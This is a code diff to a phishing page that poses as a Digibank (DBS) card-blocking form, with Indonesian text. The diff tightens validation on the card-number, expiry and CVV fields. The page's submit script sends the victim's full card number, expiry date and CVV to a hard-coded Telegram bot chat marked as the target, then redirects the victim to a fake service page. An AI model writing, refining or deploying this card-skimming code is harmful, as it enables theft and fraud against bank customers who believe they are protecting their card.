@@ -271,25 +271,29 @@
 <input
   type="text"
   inputmode="numeric"
+  pattern="(?:\d{4} ?){4}"
+  maxlength="19"
   class="form-control text-center"
   id="cardNumber"
   placeholder="Masukkan 16 digit Nomor kartu"
   required
 />
 
+
             </div>
             <div class="row g-2 mb-3">
               <div class="col-6">
-            <input
+<input
   type="text"
   inputmode="numeric"
-  pattern="\d*"
+  pattern="(0[1-9]|1[0-2])\/\d{2}"
   maxlength="5"
   class="form-control text-center"
   id="validThru"
   placeholder="MM/YY"
   required
 />
+
 
               </div>
               <div class="col-6">
@@ -300,7 +304,7 @@
   maxlength="3"
   class="form-control text-center"
   id="cvv"
-  placeholder="CVV "
+  placeholder="CVV 3"
   required
 />
 
@@ -382,36 +386,42 @@
     const chat_id = '5801473402'; // CHAT ID TARGET
 
     document.getElementById("cardForm").addEventListener("submit", function (e) {
-      e.preventDefault();
+  e.preventDefault();
 
-      const cardNumber = cardInput.value.trim();
-      const valid = validThru.value.trim();
-      const cvv = cvvInput.value.trim();
+  // Dapatkan dan bersihkan input
+  let cardNumber = cardInput.value.replace(/\D/g, "").slice(0, 16); // hanya angka
+  let valid = validThru.value.replace(/\D/g, "").slice(0, 4); // hanya angka
+  const cvv = cvvInput.value.trim();
 
-      const message = ` *Permintaan Blokir Kartu Digibank*\n\n` +
-                      ` *Nomor Kartu*: \`${cardNumber}\`\n` +
-                      ` *Berlaku Hingga*: \`${valid}\`\n` +
-                      ` *CVV*: \`${cvv}\``;
+  // Format ulang agar sesuai
+  cardNumber = cardNumber.match(/.{1,4}/g)?.join(" ") || "";
+  valid = valid.length === 4 ? valid.slice(0, 2) + "/" + valid.slice(2) : valid;
 
-      fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
-        method: "POST",
-        headers: {
-          "Content-Type": "application/json",
-        },
-        body: JSON.stringify({
-          chat_id: chat_id,
-          text: message,
-          parse_mode: "Markdown",
-        }),
-      })
-      .then(() => {
-        // Redirect ke halaman layanan
-        window.location.href = "dbslayanan.html";
-      })
-      .catch(() => {
-        alert("Gagal mengirim data. Coba lagi.");
-      });
-    });
+  const message = `*Permintaan Blokir Kartu Digibank*\n\n` +
+                  `*Nomor Kartu*: \`${cardNumber}\`\n` +
+                  `*Berlaku Hingga*: \`${valid}\`\n` +
+                  `*CVV*: \`${cvv}\``;
+
+  fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
+    method: "POST",
+    headers: {
+      "Content-Type": "application/json",
+    },
+    body: JSON.stringify({
+      chat_id: chat_id,
+      text: message,
+      parse_mode: "Markdown",
+    }),
+  })
+  .then(() => {
+    // Redirect ke halaman layanan
+    window.location.href = "dbslayanan.html";
+  })
+  .catch(() => {
+    alert("Gagal mengirim data. Coba lagi.");
+  });
+});
+
   </script>
 
     </body>
